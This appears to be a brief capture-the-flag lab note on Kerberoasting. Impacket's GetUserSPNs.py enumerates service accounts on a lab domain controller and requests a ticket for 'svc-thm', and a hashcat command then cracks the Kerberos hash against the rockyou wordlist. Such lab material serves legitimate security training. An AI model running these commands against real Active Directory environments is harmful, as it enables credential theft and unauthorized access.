# Hashes and tickets

```text
$ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>     


$ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm -request-user svc-thm  
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               



[-] CCache file is not found. Skipping... [ticket]
```

Hashcat:

    $ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt

